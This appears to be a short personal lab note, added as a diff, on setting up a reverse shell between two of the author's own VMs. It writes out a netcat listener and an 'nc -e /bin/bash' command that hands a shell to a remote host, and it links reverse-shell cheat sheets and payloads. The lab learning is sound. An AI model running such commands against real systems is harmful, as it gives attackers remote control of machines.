@@ -1,0 +1,20 @@
+This was scary easy.
+
+I made a clone of a Ubuntu server on my vmware then a kali on my vmware 
+
+I created a listener on the Ubuntu Server after logging into root on the server via the sudo -i command
+I then used the command nc -lnvp 87 -s (my source ip) 87 (port) to create the listener
+
+Then I used the nc -e /bin/bash (my ip) 87 (port)
+on the kali vm I wanted to control
+
+This opened a reverse shell on the target machine
+
+This information came from this youtube video on reverse shelling 
+https://www.youtube.com/watch?v=bXCeFPNWjsM
+
+This github was useful for the commands needed
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell
+
+This github also gave the payloads for the reverse shells
+https://github.com/antonioCoco/ConPtyShell
